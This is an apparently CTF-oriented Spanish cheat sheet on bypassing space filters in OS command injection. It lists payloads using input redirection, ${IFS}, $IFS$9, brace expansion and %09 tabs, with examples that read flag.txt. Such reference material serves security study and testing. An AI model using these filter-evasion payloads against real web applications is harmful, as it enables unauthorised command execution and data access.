---
aliases:
tags:
  - type/cheatsheet
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Bypass de Espacios en Command Injection

___

## Cheatsheet

Técnicas para ejecutar comandos cuando la barra espaciadora o el carácter `%20` están bloqueados por el filtro.

|                    **Técnica**                     |           **Sintaxis / Payload**            |               **Ejemplo Real**                |                                                   **Notas / Restricciones**                                                    |
| :------------------------------------------------: | :-----------------------------------------: | :-------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------------: |
|           <br><br>**Input Redirection**            | <br><pre><code>comando<archivo</code></pre> |   <br><pre><code>cat<flag.txt</code></pre>    |  <br>Reemplaza el espacio por el operador `<`. **Ideal para leer archivos**, no sirve para argumentos de texto plano.<br><br>  |
| <br>**Internal Field Separator**<br>_(Con Llaves)_ |     <br><pre><code>${IFS}</code></pre>      | <br><pre><code>cat${IFS}flag.txt</code></pre> |        <br>`$IFS` es una variable que contiene espacio, tab y salto de línea. Las llaves delimitan la variable.<br><br>        |
| <br>**Internal Field Separator**<br>_(Sin Llaves)_ |     <br><pre><code>$IFS$9</code></pre>      | <br><pre><code>cat$IFS$9flag.txt</code></pre> |     <br>Usar `$9` (argumento vacío) para separar la variable `$IFS` del siguiente texto si `{}` están bloqueados.<br><br>      |
|            <br><br>**Brace Expansion**             |  <br><pre><code>{comando,arg}</code></pre>  |  <br><pre><code>{cat,flag.txt}</code></pre>   |            <br>**Solo Bash.** Expande los elementos separados por coma añadiendo espacios automáticamente.<br><br>             |
|           <br><br>**Tabs (Tabuladores)**           |       <br><pre><code>%09</code></pre>       |  <br><pre><code>cat%09flag.txt</code></pre>   | <br>Muchos WAFs bloquean el espacio (`%20`) pero olvidan el tabulador (`%09`), que la shell interpreta como separador.<br><br> |
^ci-bypass-espacios

> [!TIP] Variable $IFS
> Si se quiere ver qué contiene `$IFS`en el sistema víctima (y por qué funciona esto), se puede hacer:`echo -n "$IFS" | xxd\`
> Se verá que contiene: `09` (Tab), `0a` (New Line) y `20` (Space). Cualquiera de ellos actúa como separador.


___
